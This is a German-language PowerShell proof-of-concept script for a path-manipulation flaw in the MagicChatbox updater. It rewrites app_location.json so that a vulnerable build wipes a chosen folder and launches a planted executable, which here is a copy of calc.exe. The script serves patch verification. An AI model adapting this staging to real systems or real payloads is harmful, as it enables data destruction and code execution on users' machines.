<#
    stage-scenario.ps1 — End-to-End-Aufbau fuer die app_location.json-Luecke (Patch 0004)

    NUR AUF EINEM EIGENEN TEST-RECHNER / IN EINER VM AUSFUEHREN, in einem normalen
    Benutzerkonto (NICHT als Admin). Das Skript demonstriert, dass der VERWUNDBARE Build
    einen fremd gewaehlten Ordner leert und die dort hinterlegte Datei als neue
    MagicChatbox.exe startet. Der "Payload" ist bewusst harmlos: er startet nur calc.exe
    und schreibt einen Marker. KEINE Reverse Shell, KEINE Automatik fuer den UAC-Dialog.

    Ablauf:
      1. Testordner mit Dummy-Dateien anlegen (das "Opfer").
      2. Harmlosen Payload als MagicChatbox.exe in den Update-Workspace legen.
      3. app_location.json so umschreiben, dass currentAppPath auf den Opferordner zeigt.
      4. Du startest danach von Hand den zu testenden Build:  MagicChatbox.exe -update
         - Verwundbarer Build: Opferordner wird geleert, Payload (calc) startet.
         - Gepatchter Build:   Update bricht ab, Opferordner bleibt unberuehrt.
#>

$ErrorActionPreference = 'Stop'

if (-not $IsWindows -and $PSVersionTable.Platform -ne 'Win32NT') {
    Write-Warning 'Dieses Szenario ergibt nur unter Windows Sinn.'
}

$data      = Join-Path $env:APPDATA 'Vrcosc-MagicChatbox'
$jsonPath  = Join-Path $data 'app_location.json'
$workspace = Join-Path $env:LOCALAPPDATA 'Vrcosc-MagicChatbox\update\update_unzip'
$victim    = Join-Path $env:USERPROFILE 'MCB-PoC-Opferordner'

Write-Host "== PoC-Aufbau ==" -ForegroundColor Cyan
Write-Host "Opferordner : $victim"
Write-Host "JSON        : $jsonPath"
Write-Host "Workspace   : $workspace`n"

# 1) Opferordner mit Dummy-Dateien.
New-Item -ItemType Directory -Force -Path $victim | Out-Null
'nur ein Test' | Set-Content (Join-Path $victim 'wichtige_datei_A.txt')
'nur ein Test' | Set-Content (Join-Path $victim 'wichtige_datei_B.txt')
Write-Host "[1] Opferordner gefuellt:"
Get-ChildItem $victim | ForEach-Object { Write-Host "    $($_.Name)" }

# 2) Harmloser Payload als MagicChatbox.exe. Eine kleine .cmd, umbenannt reicht fuer den
#    Nachweis NICHT (der Updater startet exakt MagicChatbox.exe). Als unschaedlichen
#    Stellvertreter kopieren wir die System-Rechner-App und legen sie unter dem Namen ab.
New-Item -ItemType Directory -Force -Path $workspace | Out-Null
$benign = Join-Path $workspace 'MagicChatbox.exe'
Copy-Item (Join-Path $env:WINDIR 'System32\calc.exe') $benign -Force
Write-Host "`n[2] Harmloser Payload als MagicChatbox.exe im Workspace abgelegt (calc.exe)."

# 3) app_location.json so umbiegen, dass currentAppPath auf den Opferordner zeigt.
New-Item -ItemType Directory -Force -Path $data | Out-Null
$payload = [ordered]@{
    metadataVersion       = 2
    currentAppPath        = $victim
    tempPath              = (Split-Path $workspace -Parent)
    unzipPath             = $workspace
    maintenanceRunnerPath = (Join-Path (Split-Path $workspace -Parent) 'maintenance_runner')
    backupPath            = (Join-Path $data 'backup')
    magicChatboxExePath   = (Join-Path $victim 'MagicChatbox.exe')
}
if (Test-Path $jsonPath) { Copy-Item $jsonPath "$jsonPath.poc-backup" -Force }
$payload | ConvertTo-Json | Set-Content $jsonPath -Encoding UTF8
Write-Host "[3] app_location.json umgeschrieben (Backup: $jsonPath.poc-backup)."

Write-Host "`n== Jetzt von Hand ausfuehren ==" -ForegroundColor Yellow
Write-Host "  <Pfad-zur-zu-testenden>\MagicChatbox.exe -update"
Write-Host ""
Write-Host "Verwundbarer Build : '$victim' wird geleert, calc.exe startet."
Write-Host "Gepatchter Build   : Update bricht mit Hinweis ab, Ordner bleibt voll."
Write-Host ""
Write-Host "Aufraeumen danach (manuell):" -ForegroundColor DarkGray

# Hinweis zum Aufraeumen (manuell):
#   Remove-Item -Recurse -Force $victim
#   Remove-Item -Recurse -Force $workspace
#   if (Test-Path "$jsonPath.poc-backup") { Move-Item "$jsonPath.poc-backup" $jsonPath -Force }
